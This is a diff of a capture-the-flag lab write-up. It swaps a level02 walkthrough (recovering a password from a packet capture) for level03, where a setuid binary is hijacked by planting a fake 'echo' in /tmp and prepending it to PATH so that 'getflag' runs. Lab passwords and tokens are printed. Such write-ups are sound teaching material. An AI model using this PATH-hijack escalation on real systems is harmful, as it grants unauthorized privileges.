@@ -11,8 +11,8 @@ Usage: ./main.sh
 |         |                             |
 | ------- | --------------------------- |
 | level03 | `kooda2puivaav1idi4f57q8iq` |
-| flag03  | `ft_waNDReL0L`              |
-| token   | `kooda2puivaav1idi4f57q8iq` |
+| flag03  |                             |
+| token   | `qi0maab88jeaj46qoumi7maus` |
 
 ## Steps to resolve on VM
 
@@ -27,42 +27,36 @@ ls -l
 > -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
 
 # The 's' means that by executing this 'level03',
-# we will get the persmissions of the individual or group that owns the file
+# we will get the persmissions of the individual or group that owns the file (here the 'flag03' user)
 ./level03
 > Exploit me
+
+# By trying to display the file content, we can see the executed command
+cat level03
+[...]
+usr/bin/env echo Exploit me
+[...]
+# 'echo Exploit me' executed with the 'usr/bin/env' command
 ```
 
-2. Use TCPICK tool to open this PCAP file. (with a docker container)
+2. Exploit that 's' permission to force 'level03' file to execute 'getflag' command
 
 ```bash
-# First launch the docker container which will use "kali-script.sh' to run TCPICK
-docker run -e SNOW_HOST=$SNOW_HOST -it -v $PWD/$SCRIPT:/$SCRIPT --rm kalilinux/kali-rolling bash kali_script.sh
+# First create a fake 'echo' command that will execute 'getflag'
+echo "getflag" > /tmp/echo
+# And give it execute permission
+chmod +x /tmp/echo
 
-# After installing the dependencies, we copy 'level02.pcap' file
-apt-get update && apt-get install -y openssh-client && apt-get install -y tcpick
-scp -q -o "StrictHostKeyChecking no" -P $SNOW_PORT $SNOW_USER@$SNOW_HOST:$PCAP_PATH ./
-
-# We open it with TCPICK with the flag -yU to be able to read Unprintable characters
-tcpick -C -yU -r level02.pcap
-# It displays the data captured
+# 'level03' executes 'usr/bin/env' command,
+# so we need to trick it and replace the 'echo' command with our fake one by adding it at the beginning of PATH
+PATH=/tmp:$PATH
 ```
 
-3. Format the found password
+3. Now execute 'level03' which will use our fake 'echo' to get the flag
 
 ```bash
-After checking the displayed data, we can see the password "ft_wandr<7f><7f><7f>NDRel<7f>L0L"
-
-"7F" seems to be the "DEL" character in the ASCII table, after some reflexions,
-we can understand that we need to reproduce this delete key event
-
-Which finally gives us the real password : "ft_waNDReL0L"
-```
-
-4. Now we can connect to 'flag02' and use 'getflag' to get the token
-
-```bash
-ssh -t -q $FLAG_LEVEL@$SNOW_HOST -p $SNOW_PORT "getflag"
-> Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
+./level03
+> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 ```
 
 ---
@@ -72,3 +66,5 @@ ssh -t -q $FLAG_LEVEL@$SNOW_HOST -p $SNOW_PORT "getflag"
 ### SHELL
 
 - [What does s permission means ?](https://askubuntu.com/questions/431372/what-does-s-permission-means#:~:text=s%20(setuid)%20means%20set%20user%20ID%20upon%20execution.&text=In%20this%20s%20permission%20was,user%2DID%20mode%20is%20set.)
+- [What is /usr/bin/env](https://stackoverflow.com/questions/43793040/how-does-usr-bin-env-work-in-a-linux-shebang-line#:~:text=env%20is%20the%20name%20of%20a%20Unix%20program.&text=Therefore%2C%20%2Fusr%2Fbin%2F,that%20contains%20the%20python3%20executable.)
+- [How to add directory at beginning of PATH](http://www.troubleshooters.com/linux/prepostpath.htm)
